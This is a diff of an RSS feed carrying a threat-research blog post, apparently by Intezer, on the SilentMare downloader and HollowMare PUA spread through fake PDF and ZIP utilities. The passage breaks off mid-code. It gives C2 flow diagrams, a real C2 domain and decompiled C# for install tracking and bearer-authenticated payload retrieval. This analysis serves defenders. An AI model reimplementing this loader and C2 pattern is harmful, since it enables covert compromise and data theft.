@@ -1,4 +1,885 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intezer Research –</title><link>https://research.intezer.com/</link><description>Recent content on Intezer Research</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 20 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://research.intezer.com/index.xml" rel="self" type="application/rss+xml"/><item><title>When the AI Edits Its Own Trust Boundary: Remote Code Execution Vulnerability in AWS's Agentic IDE</title><link>https://research.intezer.com/blog/2026/07/remote-code-execution-kiro/</link><pubDate>Mon, 20 Jul 2026 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2026/07/remote-code-execution-kiro/</guid><description>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Intezer Research –</title><link>https://research.intezer.com/</link><description>Recent content on Intezer Research</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 27 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://research.intezer.com/index.xml" rel="self" type="application/rss+xml"/><item><title>Two Trojan Families Trotting in Through Google Search Ads</title><link>https://research.intezer.com/blog/2026/07/two-trojan-families/</link><pubDate>Mon, 27 Jul 2026 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2026/07/two-trojan-families/</guid><description>
+&lt;details class="hx:last-of-type:mb-0 hx:rounded-lg hx:bg-neutral-50 hx:dark:bg-neutral-800 hx:p-2 hx:mt-4 hx:group" &gt;
+&lt;summary class="hx:flex hx:items-center hx:cursor-pointer hx:select-none hx:list-none hx:p-1 hx:rounded-sm hx:transition-colors hx:hover:bg-gray-100 hx:dark:hover:bg-neutral-800 hx:before:mr-1 hx:before:inline-block hx:before:transition-transform hx:before:content-[''] hx:dark:before:invert hx:rtl:before:rotate-180 hx:group-open:before:rotate-90"&gt;
+&lt;strong class="hx:text-lg"&gt;AI Generated Summary&lt;/strong&gt;
+&lt;/summary&gt;
+&lt;div class="hx:p-2 hx:overflow-hidden"&gt;
+&lt;ul&gt;
+&lt;li&gt;We are documenting two malware families, &lt;em&gt;SilentMare&lt;/em&gt; and &lt;em&gt;HollowMare&lt;/em&gt;, that
+are spreading via Trojanized utility applications such as PDF converters and
+ZIP tools.&lt;/li&gt;
+&lt;li&gt;SilentMare is a downloader that serves as a beachhead for future compromises.
+We have been tracking it back to 2024, across three different generations.&lt;/li&gt;
+&lt;li&gt;We have not been able to retrieve a payload from any of the SilentMare C2
+servers, so the threat actor&amp;rsquo;s end goal remains unknown.&lt;/li&gt;
+&lt;li&gt;SilentMare swaps out the implementation language between generations (C#/C++,
+Rust, F#, Python via PyInstaller, and C++) but the operational pattern stays
+the same: a custom installer, a scheduled task, an updater that checks in
+once a day, and an AES-encrypted .NET payload that is loaded directly from
+memory.&lt;/li&gt;
+&lt;li&gt;HollowMare is a PUA whose only goal is to force-install a browser extension
+or hijack the user&amp;rsquo;s default search engine. The installer does the malicious
+work itself, and there is no second stage.&lt;/li&gt;
+&lt;li&gt;HollowMare uses two techniques to modify the browser: driving the browser
+window with synthetic keystrokes, or overwriting a file in the browser&amp;rsquo;s
+profile folder with a version provided by the C2 server.&lt;/li&gt;
+&lt;li&gt;Both families are delivered via custom installers that create desktop
+shortcuts, register an uninstaller, time-stomp the PE timestamp, and
+obfuscate strings to hide their activity from static analyzers.&lt;/li&gt;
+&lt;li&gt;The application-hosting infrastructure for both families overlaps, and the
+signing certificates are issued to similar entities based in the same city
+and the neighboring cities. This is not enough to conclude that the same
+threat actor is behind both families.&lt;/li&gt;
+&lt;li&gt;Our view is that these applications have no reason to be in an enterprise
+environment and should be treated as malware. Even when they provide a
+functional feature, the operation is performed on a server, so the user&amp;rsquo;s
+files are shared with an untrusted third party.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;/details&gt;
+&lt;h2&gt;Introduction&lt;span class="hx:absolute hx:-mt-20" id="introduction"&gt;&lt;/span&gt;
+&lt;a href="#introduction" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;During the second half of 2025, we saw a surge of reports on malicious &amp;ldquo;fake&amp;rdquo;
+applications. Most of these applications were for PDF modifications or file
+conversion tools. They are targeting users who are looking for simple utilities
+to get their work done, for example, to merge two PDF files into a single PDF.
+This user is more likely an enterprise user than a home user. While many of
+these applications provide the functionality, they are the classic definition
+of a &lt;em&gt;Trojan Horse&lt;/em&gt;. Researchers at GData called out the
+&lt;a href="https://www.gdatasoftware.com/blog/2025/08/38247-justaskjacky-ai-trojan-horse-comeback"target="_blank" rel="noopener"&gt;comeback&lt;/a&gt;
+of the &lt;em&gt;Trojan Horse&lt;/em&gt; in one of their blog posts on this topic. TrendMicro is
+&lt;a href="https://www.trendmicro.com/en_us/research/25/i/evilai.html"target="_blank" rel="noopener"&gt;hypothesizing&lt;/a&gt;
+that threat actors are using AI coding tools to create these fake applications.
+We don’t disagree with this hypothesis, since AI coding tools make it very easy
+to create &amp;ldquo;shallow&amp;rdquo; applications that hide malicious behavior.&lt;/p&gt;
+&lt;p&gt;One of the reports that set off the hunt for trojanized applications was the
+report on
+&lt;a href="https://blog.lukeacha.com/2025/06/suspicious-recipe-app.html"target="_blank" rel="noopener"&gt;TamperedChef&lt;/a&gt;.
+&lt;a href="https://blog.dingusxmcgee.com/blog/2025/06/06/Recipe-For-Adware.html"target="_blank" rel="noopener"&gt;TamperedChef&lt;/a&gt;
+was a trojanized recipe app that used a covert command and control (C2)
+communication channel. Unfortunately, no one has publicly reported what the
+final payload delivered was. Maybe the threat actor is the only one that knows
+what the intended payload was. Later another covert C2 channel
+&lt;a href="https://www.guidepointsecurity.com/blog/ai-exposes-homoglyph-hustle/"target="_blank" rel="noopener"&gt;was found&lt;/a&gt;
+to be used by the calendar application Calendaromatic. This sparked an interest
+in the industry to find more interesting Trojans, and others have been found.&lt;/p&gt;
+&lt;p&gt;Some of these findings have been misattributed to TamperedChef. Unfortunately,
+&lt;em&gt;TamperedChef&lt;/em&gt; has become the noun used to describe this type of trojanized
+application, even though some are very different from TamperedChef. One of
+these families is &lt;em&gt;BaoLoader&lt;/em&gt;. One of the first reports on a trojanized
+application with BaoLoader was reported on by
+&lt;a href="https://www.truesec.com/hub/blog/tamperedchef-the-bad-pdf-editor"target="_blank" rel="noopener"&gt;Truesec&lt;/a&gt;.
+Expel later
+&lt;a href="https://expel.com/blog/the-history-of-appsuite-the-certs-of-the-baoloader-developer/"target="_blank" rel="noopener"&gt;identified&lt;/a&gt;
+the trojanized application as BaoLoader. We agree with Expel&amp;rsquo;s assessment that
+this is not TamperedChef. The way the malware in the AppSuite PDF Editor works
+is very different from TamperedChef. The &amp;ldquo;warhead&amp;rdquo; is not retrieved via a
+covert C2 channel. It&amp;rsquo;s part of the installation. GData provided a detailed
+analysis of the malware in a
+&lt;a href="https://blog.gdatasoftware.com/2025/08/38257-appsuite-pdf-editor-backdoor-analysis"target="_blank" rel="noopener"&gt;report&lt;/a&gt;
+they released in August 2025.&lt;/p&gt;
+&lt;p&gt;In this report, we are documenting the two malware families &lt;em&gt;SilentMare&lt;/em&gt; and
+&lt;em&gt;HollowMare&lt;/em&gt; which are spreading via trojanized applications. SilentMare shares
+the similarity of serving as a beachhead with TamperedChef. Unfortunately, we
+haven&amp;rsquo;t been able to retrieve the payload, so we don&amp;rsquo;t know exactly the threat
+actor&amp;rsquo;s objective. The second family, HollowMare, is something that would more
+likely be classified as a potentially unwanted application (PUA). It doesn&amp;rsquo;t
+provide a functional application. Instead it hijacks the search engine in the
+user&amp;rsquo;s browser or installs a browser extension.&lt;/p&gt;
+&lt;p&gt;Our view is that these products have no reason to be in an enterprise
+environment and should be treated as malware. From the surface, it&amp;rsquo;s not
+possible for a user to determine if the application that they are downloading
+contains a stealer, a beachhead, or something that just hijacks their default
+search engine in the browser. When they provide a functional application, our
+findings are that they do not perform the operation offline. Instead the
+applications serve as thin clients that send the files to a server to perform
+the operation. This means that the files are shared with an untrusted third
+party.&lt;/p&gt;
+&lt;h2&gt;SilentMare&lt;span class="hx:absolute hx:-mt-20" id="silentmare"&gt;&lt;/span&gt;
+&lt;a href="#silentmare" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;SilentMare is a malware family that is currently getting misidentified as a
+PUA. Based on our analysis, we are classifying this family as a downloader that
+serves as a beachhead for future compromises. The malware is marketed to users
+as utility tools via advertisements, such as PDF converters. While the
+application provides the user with some options to convert files to PDFs, none
+of the actions are performed on the user&amp;rsquo;s machine. Instead, these applications
+are simple web clients that upload the files to a server for conversion. In
+enterprise environments, these applications should never be allowed, as users
+of these products are exfiltrating internal documents to an unknown entity. In
+addition, SilentMare is sitting and waiting for a payload to execute from the
+malware operator.&lt;/p&gt;
+&lt;p&gt;We have been tracking SilentMare activity back to 2024, and it was still active
+at the end of 2025. Throughout this time period, we have seen three different
+generations. It is possible the activity goes back even further. In these
+generations, the coding language used sometimes changes but certain tactics are
+consistent, allowing us to connect them. It all starts with a custom installer.
+In the first and second generations, the installers were signed with
+extended-validation (EV) certificates. These EV certificates were all issued to
+Israeli companies with a base in Tel Aviv or neighboring cities. The most
+recent generation does not use signed files.&lt;/p&gt;
+&lt;p&gt;The installer has two sets of goals: install the application and set up the
+updater. The updater is what serves as the beachhead. The application and the
+updater are installed in a folder under &lt;code&gt;%LOCALAPPDATA%&lt;/code&gt; or &lt;code&gt;%APPDATA%&lt;/code&gt;,
+depending on whether the installer runs with administrator permissions. Each
+installation is tracked using a generated GUID stored in the application
+folder. The timestamp of when the file that stores the GUID was created is used
+as an installation timestamp. This information is sent to the update server
+every time the updater runs. The updater is executed, usually once a day, via a
+scheduled task that was created by the installer.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt; Installer executed
+├── Install updater to %APPDATA%
+├── Generate GUID
+│ └── Store GUID in app folder
+├── Create scheduled task to run updater
+└── Schedule task runs daily
+└── Executes updater
+├── Sends GUID and install timestamp to C2
+└── Checks for payload from C2
+└── Decrypts and executes the .NET assembly from memory&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;In addition, the installer creates a desktop shortcut and adds an entry to
+&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\&amp;lt;ProductName&amp;gt;&lt;/code&gt; so the
+application can be uninstalled using Windows&amp;rsquo; uninstall functionality. While
+the installer adds a specific uninstaller, it doesn&amp;rsquo;t fully uninstall itself.
+It just removes the desktop shortcut and the registry entry. Instead of
+removing the updater and the application, the uninstaller phones home,
+informing the operator that the application has been uninstalled. All the
+telemetry it sends back is encrypted using a short XOR key.&lt;/p&gt;
+&lt;p&gt;Telemetry is collected at multiple steps as part of its operation, including by
+the updater. SilentMare uses a set of three domains for each application. The
+first domain is the &amp;ldquo;app&amp;rdquo; domain. This is the user-facing domain. It hosts a
+website where the application is promoted and downloadable. Traffic to these
+sites comes from Google search ads. The second domain is the &amp;ldquo;C2&amp;rdquo; domain for
+the installer, and the third domain is the &amp;ldquo;C2&amp;rdquo; domain for the updater.&lt;/p&gt;
+&lt;p&gt;The updater checks in with its C2 to see if a payload is available to be
+executed. If it gets an authorization token, it downloads the payload from the
+same C2 server. The payload is encrypted with AES, and the updater expects it
+to be a .NET file. The decrypted payload is executed directly from memory
+without writing anything to disk.&lt;/p&gt;
+&lt;p&gt;The diagram below shows the communication with the updater&amp;rsquo;s C2 server. The
+diagram is based on the flow of the most recent version, but the flows are very
+similar across all other versions. First, the updater sends the installation
+identifier, a current timestamp, and the installation timestamp. The C2 server
+responds with an auth token if the next stage should be downloaded and
+deployed. The authentication token is added to the &lt;code&gt;Authorization&lt;/code&gt; header in a
+request to another path. The server returns an AES-CBC encrypted payload that
+is either &lt;em&gt;Base64&lt;/em&gt; or &lt;em&gt;ASCII85&lt;/em&gt; encoded, depending on the version. If the
+payload is successfully decoded and decrypted, the updater sends a status
+update to the C2 server. This data is XOR-encrypted using an embedded key. The
+payload is loaded and executed. If the execution fails, the failure is reported
+back to the C2 server via the telemetry. As part of our investigations, we
+haven&amp;rsquo;t been able to retrieve a payload from the C2 server, so the end goal
+remains unknown.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt; &amp;#43;-------------------&amp;#43;
+| Host Fingerprint |
+| (sub_14000F470) |
+&amp;#43;--------&amp;#43;----------&amp;#43;
+| JSON: {&amp;#34;currtm&amp;#34;:&amp;#34;...&amp;#34;,&amp;#34;tid&amp;#34;:&amp;#34;...&amp;#34;,&amp;#34;tinst&amp;#34;:&amp;#34;...&amp;#34;}
+v
+&amp;#43;-------------------&amp;#43; POST /login &amp;#43;------------------&amp;#43;
+| C2 Orchestrator | -------------------------&amp;gt; | domenget.com |
+| (sub_1400040C0) | GatewayClient/5.0 | |
+| | X-Request-Type: data | Response: |
+| | &amp;lt;------------------------- | Auth token |
+| | &amp;#43;------------------&amp;#43;
+| |
+| Parse token | POST /post
+| Build JSON | -------------------------&amp;gt; &amp;#43;------------------&amp;#43;
+| Add Bearer auth | Authorization: Bearer | domenget.com |
+| | X-Request-Type: view | |
+| | &amp;lt;------------------------- | Response: |
+&amp;#43;--------&amp;#43;----------&amp;#43; | Encrypted .NET |
+| | assembly |
+| ASCII85 -&amp;gt; AES-CBC decrypt -&amp;gt; B64 decode
+v
+&amp;#43;-------------------&amp;#43;
+| CLR Loader | POST /pdata (metrics)
+| (sub_140004F50) | ------------------------------------------&amp;#43;
+| | Metrics/4.0, text/plain |
+| Loads &amp;amp; executes | Body: Base64(XOR(URLEncode(telemetry))) |
+| .NET assembly | v
+| in-process | &amp;#43;------------------&amp;#43;
+&amp;#43;-------------------&amp;#43; | domenget.com |
+| /pdata (one-way) |
+On .NET exceptions: &amp;#43;------------------&amp;#43;
+&amp;#43;-------------------&amp;#43;
+| Exception Handler | POST /pdata
+| (sub_140062651 / | -----&amp;gt; domenget.com/pdata
+| sub_140062796) | XOR&amp;#43;B64 encrypted error
+&amp;#43;-------------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3&gt;The 2024 Era&lt;span class="hx:absolute hx:-mt-20" id="the-2024-era"&gt;&lt;/span&gt;
+&lt;a href="#the-2024-era" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The earliest version of SilentMare that was still active in 2025 dates back to
+the second half of 2024. That meant that they had been active for almost a
+year. The two trojanized applications are &lt;em&gt;PDF Skills&lt;/em&gt; and &lt;em&gt;Zip This&lt;/em&gt;. While
+one is a PDF converter tool and the other is a ZIP archiving tool, they are
+almost identical under the hood.&lt;/p&gt;
+&lt;p&gt;Both applications come packaged in a custom installer written in .NET. The
+installer checks with the installer C2 server if SilentMare should be installed
+on the machine. This era&amp;rsquo;s installer tries to run with administrator
+permission, by re-launching and prompting the users for UAC, so it can install
+into &lt;code&gt;%APPDATA%&lt;/code&gt; instead of &lt;code&gt;%LOCALAPPDATA%&lt;/code&gt;. Additionally, it checks and adds
+a global ID into the file &lt;code&gt;%APPDATA%\SMCR\userId.txt&lt;/code&gt;. This file is used by
+both &lt;em&gt;PDF Skills&lt;/em&gt; and &lt;em&gt;Zip This&lt;/em&gt; to identify &amp;ldquo;returning&amp;rdquo; users.&lt;/p&gt;
+&lt;p&gt;The updater component is made up of two parts: an executable and a DLL file.
+The files contain mixed managed (C#) and unmanaged (C++) code. Most of the
+logic is implemented in the DLL file. The updater sends the install identifier
+and the installation timestamp to the update C2 server. If it gets content
+back, it expects it to be another .NET executable that is AES-256-CBC
+encrypted. The IV is the first 16 bytes of the data returned by the C2 server,
+while the key is generated by the updater and sent to the server as part of the
+initial request. The decrypted executable is loaded into the process directly
+from memory without writing anything to disk.&lt;/p&gt;
+&lt;p&gt;Most of the update process stays the same between different eras. The major
+changes observed are around the sources of the key and the IV.&lt;/p&gt;
+&lt;h3&gt;The August 2025 Era&lt;span class="hx:absolute hx:-mt-20" id="the-august-2025-era"&gt;&lt;/span&gt;
+&lt;a href="#the-august-2025-era" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In this era, all of the technology has been swapped out. It appears that the
+threat actor is maintaining multiple stacks. For example, &lt;em&gt;Easy 2 Convert&lt;/em&gt; uses
+a custom Rust-based installer, while &lt;em&gt;Convert Mate&lt;/em&gt;, with a build four days
+later, has a custom installer written in F# and C#. While they are different
+implementations, they share the same behavior between themselves, many going
+back to the previous era. Some changes in this era are the removal of the UAC
+elevation and the global ID. Instead, a check for the Chrome browser has been
+added. The updater component is only installed if Chrome is available on the
+machine. This moves the decision logic of installing SilentMare away from the
+C2 server and instead to the installer.&lt;/p&gt;
+&lt;p&gt;While these two applications have two completely different installers, the
+updater is essentially identical. The malware author has moved away from using
+the C#/C++ hybrid EXE-DLL combo to instead use a component written in F#.
+Another change is the AES key and the IV. Instead of generating a random key
+with each request, the updater sends the installation timestamp and a current
+timestamp to the C2 server. The payload is encrypted with the key being the
+SHA256 hash of the installation timestamp and the IV being the MD5 hash of the
+&lt;em&gt;current&lt;/em&gt; timestamp sent in the authentication request. The code-snippet below
+shows extracted pseudo-code of this logic.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c#" data-lang="c#"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SessionInfoGatherer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// Code that gathers install tracking data.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;SessionInfo&lt;/span&gt; &lt;span class="n"&gt;GetSessionInfo&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;SessionInfo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getInstallDate&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;getUserID&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;internal&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;getInstallDate&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetCreationTime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Combine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Environment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetFolderPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Environment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SpecialFolder&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;LocalApplicationData&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;ConvertMate&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;id.txt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;)).&lt;/span&gt;&lt;span class="n"&gt;ToUniversalTime&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;yyyy-MM-dd HH:mm:ss&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;internal&lt;/span&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;getUserID&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;File&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadAllText&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Combine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Environment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetFolderPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Environment&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SpecialFolder&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;LocalApplicationData&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;ConvertMate&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;id.txt&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// Method used to download the payload from the C2 server. This method is only called&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// if a token is returned when it checks for an &amp;#34;update&amp;#34;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;override&lt;/span&gt; &lt;span class="n"&gt;FSharpAsync&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IEnumerable&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpClient&lt;/span&gt; &lt;span class="n"&gt;webClient&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DateTime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Now&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;yyyyMMddHHmmss&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;webClient&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DefaultRequestHeaders&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Authorization&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;AuthenticationHeaderValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;Bearer&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;
